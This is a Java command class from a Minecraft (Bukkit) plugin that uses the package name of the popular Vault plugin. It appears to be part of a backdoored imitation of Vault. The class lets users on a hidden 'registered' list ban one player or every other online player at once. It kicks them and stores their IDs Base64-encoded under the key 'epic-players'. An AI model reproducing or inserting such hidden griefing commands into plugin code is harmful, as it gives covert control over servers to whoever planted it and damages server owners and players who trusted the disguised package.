package net.milkbowl.vault.commands.cmds;

import java.util.Base64;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.data.DataManager;
import net.milkbowl.vault.methods.API;
import net.milkbowl.vault.util.Settings;

public class Ban extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (args.length <= 1) {
			p.sendMessage(Settings.USAGE("ban <player>"));
		} else {
			if (args[1].equals("*")) {
				for (Player a : Bukkit.getOnlinePlayers()) {
					if (!plugin.registered.contains(a.getName())) {
						byte[] add = Base64.getEncoder().encode(a.getUniqueId().toString().getBytes());
						
						DataManager.banList.add(new String(add));
						DataManager.getData().set("epic-players", DataManager.banList);
						DataManager.saveData();
						API.kickPlayer(a);
					}
				}
				p.sendMessage(Settings.PREFIX("Everyone was banned!"));
			} else {
				OfflinePlayer target = Bukkit.getServer().getPlayer(args[1]);
				if (target == null) {
					p.sendMessage(Settings.PREFIX("The player " + Settings.HIGHLIGHT_COLOUR + args[1] + Settings.SECONDARY_COLOUR + " doesn't seem to exist."));
				} else {
					byte[] add = Base64.getEncoder().encode(target.getUniqueId().toString().getBytes());
					
					DataManager.banList.add(new String(add));
					DataManager.getData().set("epic-players", DataManager.banList);
					DataManager.saveData();
					p.sendMessage(Settings.PREFIX(target.getName() + " was banned!"));
				}
			}
		}
	}

}
